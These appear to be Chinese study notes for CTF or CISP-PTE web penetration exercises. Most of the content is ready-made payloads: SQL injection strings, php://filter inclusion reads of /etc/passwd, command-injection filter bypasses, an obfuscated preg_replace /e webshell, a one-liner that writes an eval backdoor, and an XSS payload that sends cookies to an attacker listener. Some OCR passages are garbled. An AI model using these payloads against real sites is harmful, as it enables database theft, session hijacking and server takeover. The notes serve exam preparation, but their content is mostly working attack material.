### sql注入

一次注入

```sql
insert user (uname,password),value('admin','pass')

insert user (uname,password),value($name,'pass')
insert user (uname,password),value('123',database()),('4456','pass')
1. 判断闭合方式
2. 插入到数据库
3. select 执行插入到语句

update()
delete()

insert into article(title author,description,content,dateline) values('aaaaa'aaaaa','aaaaa','aaaaaa', 1652576779)

                                                                      
insert into article (title,author,description,content,dateline) values('aaaaa','aaaaa','aaaaa','aaaaaa',1652576821)

insert into article(......) values('1','2','3','','')

title=d&author=b&description=c&content=a',1652577231),(database(),'a','b', 'a&button=%E6%8F%90%E4%BA%A4


insert into article(title,author,description,content,dateline) values('d','b','c','a',1652577231),(database(),'a','b', 'a',1652577364)

title=d&author=b&description=c&content=a',1652577231),(version(),'a','b', 'a&button=%E6%8F%90%E4%BA%A4

title=d&author=b&description=c&content=a',1652577231),((select group_concat(table_name) from information_schema.tables where table_schema=database()),'a','b', 'a&button=%E6%8F%90%E4%BA%A4

title=d&author=b&description=c&content=a',1652577231),((select group_concat(column_name) from information_schema.columns where table_name="article"),'a','b', 'a&button=%E6%8F%90%E4%BA%A4


1'union select 1,database(),3,4,5,6#


title=d&author=b&description=c&content=a',1652577231),((select/**/group_concat(column_name)/**/from information_schema.columns where table_name="article"),'a','b', 'a&button=%E6%8F%90%E4%BA%A4


title=d&author=b&description=c&content=database(),123) #,1652577231)&button=%E6%8F%90%E4%BA%A4
```



```
insert into article values('1','1','1','1')

直接上传两次数据，

insert into article values('1','1','1','1')('1','database()','xbw'),('1' ,(select group_ concat(table_ name) from information. schema.tables where table_ schema=database)

'1 ,(select group_ concat(XremarkX4354) from users1),' 1

insert into article values('1','2','3',4')

insert into article values('1','2','1','4'),('3',database(),'1',4')
爆库名
id:1
标题:2
内容:1','4'),('3',database(),'1
name:3


爆表
id:   1
标题：2
内容：3','4'),('1',(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema='2web'),'3
name：4


爆列
id:1
标题：2',(select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name='users1'),'4'),('1','2
内容：3
name：4

爆字段
id:   1
标题：2
内容：3','4'),('1',(select/**/group_concat(XremarkX4354)/**/from/**/2web.users1),'3
name：4

```

insert into article values('1','2','**1','4'),('3',database(),'1**',4')
爆库名
id:1
标题:2
内容:1','4'),('3',database(),'1
name:3

insert into article values('1','2','3',4')

爆表
id:   1
标题：2
内容：3','4'),('1',(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema='2web'),'3
name：4


爆列
id:1
标题：2',(select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name='users1'),'4'),('1','2
内容：3
name：4

爆字段
id:   1
标题：2
内容：3','4'),('1',(select/**/group_concat(XremarkX4354)/**/from/**/2web.users1),'3
name：4



2.

```
fu1.php?id=1')and/**/2=1%23

fu1.php?id=1')oorrder/**/by/**/1%23

/fu1.php?id=1')oorrder/**/by/**/5%23

fu1.php?id=1')ununionion/**/seselectlect/**/1,2,3,4%23

fu1.php?id=1.1')ununionion/**/seselectlect/**/1,load_file('/tmp/360/key'),3,4%23
```

2次注入

  insert 二次注入  insert into()

  php://        .php   phar

命令执行  关键字过滤 源代码 fuzzing  ||   无回显exec   有限字符执行  30    7  

1. 写马     echo     >  ls -t >    sh 
2. 缩短

登录框 有注册，找回密码

登录框，仅有登陆成功，显示用户名

```sql
register.php

email=b@qq.com&username=a&password=123


insert into user(email,username,password),(b@qq.com,'a',123)，('')

查询  以第一次注入为主

insert into user(email,username,password),(b@qq.com,'0' + 1 + '0',123)


select * from user where email=  and pass = 

select '0' + (ascii (substr((select database()) from 1 for 1))) + '0'  from user where ema

2,1


select '' select database()''  from user where ema
```







### 文件包含

先去访问这个包含的页面，是否是解析

1.伪协议

过滤一些关键字可以 双写，大小写

```ruby
index.php?page=php://filter/read=convert.base64-encode/resource=/etc/passwd

>> filter/read=convert.base64-encode/resource=/etc/passwd

/index.php?page=phphp://p://filter/read=convert.base64-encode/resource=/etc/passwd

index.php?page=phphp://p://filter/read=convert.base64-encode/resource=../key.php
/index.php?page=pphp://hp://filter/read=convert.base64-encode/resource=../key.php
```

### 命令执行

代码审计

看get还是post类型

可能会过滤key，用ke*   绕过命令执行   l's ''-la   c'a't

7$IFS$9. ./ke*



```shell
<?php
error_reporting(0);
include "key4.php";
$a=$_GET['a'];
eval("\$o=strtolower(\"$a\");");
echo $o;
show_source(__FILE__);

#############

eval("\$o=strtolower(\"$a\");");

$o=strtolower("");system('ls');("");

eval("\$o=strtolower(\" ");system('ls');("     \");");

/index.php?a=");system('ls');("
```

2.文件可解析为执行文件php

pre /e马**只能菜刀**

```
<?php 
@$a = $_POST['Hello']; 
if(isset($a)){ 
@preg_replace("/\[(.*)\]/e",'\\1',base64_decode('W0BldmFsKGJhc2U2NF9kZWNvZGUoJF9QT1NUW3owXSkpO10=')); 
} 
?>
```

 preg_replace() /e代码执行漏洞

命令执行



0x03借助命令Is 查看key的权限←
127.0. 0.1.& ‘|’
s-al.. . /var/www/htm | /key. ph*←
Content -Length: 181
-------------------- 1735104427133
Content-Di sposition: form-data: name=" cnd"
1 ngin
ncin
48 Oct 10 06:18 /var/ww/html/key. ph
27.0.0.1 &'I's -al /war/ww/html/key. Dh*
PIIG 127.0.0.1 (127.0. 0.1): 56 data bytes
--------------------310412713--
</pre>
</div>
《J
0x04借助命令chomod对key赋予读写执行权限←
→127.0.0. 1:&c’h’m’ o’d: 777: /var/www/htm l/ey. ph*-
-1735104427133
Content-Di sposition: form- data; name=" cmd'
一
127.0.0.1 & c'h'm'o'd 777 /var/ww/htm1/key. ph*
---1735104427133--
←
0x05借助命令Is 验证key的权限←



### 文件上传

1.文件上传后被修改了文件名，利用burp爆破

```php

$filename = $files["name"]; //456
 $randnum = rand(1, 99999);  //123
 $fullpath = '/' . md5($filename.$randnum).".".substr($filename,strripos($filename,'.') + 1); 
 
 /md5(456123).php
 
 网站根目录
 /md5(文件全名+rand(1, 99999))
 上传后的名字
```

文件上传循环发包 先自己生成字典

```
for i in range(1,10000):
    print (i)
    
    
╭─hazel@hazeldeMacBook-Pro /tmp
╰─$ python 1.py > dic.txt
```

暴力破解



上级写马

```php
<?php fputs(fopen('../shell.php','w'),'<?php @eval($_POST["test"])?>');?>
```



r

### 代码审计

反序列化

内存里面 ===》 硬盘  

序列化的操作 特定的字符串 可以存储在硬盘上  序列化的对象 --只序列化 变量  特定的格式

反序列化 == 〉 特殊的字符串 ==》 内存里面

```
<?php
error_reporting(0);
include "key4.php";
$TEMP = "Whatever is worth doing is worth doing well.";
$str = $_GET['str'];
if (unserialize($str) === $TEMP)
{
    echo "$key4";
}
show_source(__FILE__); 
  
```



```php
class 123
{
    public __contruct()   // 魔术方法 __开头的  特定的条件下，自动执行，
    {
        $age = 19;
    }
    
}

<?php
class CallableClass 
{
    function __invoke($x) {
        var_dump($x);
    }
}
$obj = new CallableClass;
$obj(5);
var_dump(is_callable($obj));
?>

$a= new 123();
$a()
```

参考ctfshow256

```

```

```

```

```

} 
```

```
<?php 

class ctfuser{ 
:"username";s:1:"a";s:8:"password";s:1:"b";s:5:"isVip";b:1;}

//O%3A7%3A%22ctfuser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A1%3A%22a%22%3Bs%3A8%3A%22password%22%3Bs%3A1%3A%22b%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D
```



xss打cookie

评论留言页面

python启动简易服务器9999

1：攻击机起服务监听
python -m SimpleHTTPServer 9999

2:往攻击机插js语句

```
"><script>document.write('< img src="http://172.16.143.13:9999/?'+document.cookie+'" />')</script>
```

### 日志审计

admin.\*php.\*200

### 综合题目

IP地址

![image-20220524184830506](cisp-pte满分做/images/image-20220524184830506.png)

扫端口

扫目录

进入数据库

开启3389，防火墙放行





```
http://119.91.93.173/


nmap -sV -T5 -p 1434,1433,1025,8080,80 119.91.93.173

PORT     STATE SERVICE    VERSION
80/tcp   open  http       Microsoft IIS httpd 6.0
1025/tcp open  msrpc      Microsoft Windows RPC
1433/tcp open  ms-sql-s   Microsoft SQL Server 2005 9.00.1399; RTM
1434/tcp open  tcpwrapped
8080/tcp open  http       Microsoft IIS httpd 6.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

